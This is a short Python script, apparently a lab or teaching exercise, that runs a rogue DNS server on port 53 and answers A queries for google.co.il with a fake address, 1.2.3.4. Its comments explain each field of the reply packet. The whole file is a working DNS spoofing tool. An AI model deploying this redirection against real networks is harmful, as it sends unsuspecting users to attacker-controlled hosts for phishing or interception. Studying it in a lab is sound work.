from dnslib import DNSRecord, DNSHeader, RR, A, QTYPE
import socket

DNS_SERVER_IP = "0.0.0.0"
DNS_SERVER_PORT = 53

TARGET_DOMAIN = "google.co.il."
FAKE_IP = "1.2.3.4"

def dns_udp_server(ip, port):

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind((DNS_SERVER_IP, DNS_SERVER_PORT))

    print("DNS server listening on port 53...")

    while True:
        try:
            data, addr = server_socket.recvfrom(512)
            dns_handler(data, addr, server_socket)

        except Exception as ex:
            print(f"Client exception! {ex}")

def dns_handler(data, addr, sock):

    request = DNSRecord.parse(data)

    qname = str(request.q.qname)
    qtype = QTYPE[request.q.qtype]

    print(f"Query from {addr}: {qname} ({qtype})")

    if qname == TARGET_DOMAIN and qtype == "A":

        # Craft DNS reply
        DnsReplyPacket = DNSRecord(
            # Create DNS header
            DNSHeader(
                # Copy ID from request (ID is same for request and reply of same query)
                id=request.header.id,
                # Packet is a response
                qr=1,
                # Authoritative Answer
                aa=1,
                # Recursion Available
                ra=1
            ),
            # Copy query section from request
            q=request.q,
            # Create answer section
            a = RR(
                # Name being queried (copy from request)
                rname=qname,
                # Record type A (We are only recieving A queries)
                rtype=QTYPE.A,
                # Record class internet
                rclass=1,
                ttl=60,
                # The fake IP address to redirect to
                rdata=A(FAKE_IP)
            )
        )
        sock.sendto(DnsReplyPacket.pack(), addr)
        print(f"Redirected {qname} → {FAKE_IP}")

def main():
    dns_udp_server(DNS_SERVER_IP, DNS_SERVER_PORT)

if __name__ == "__main__":
    main()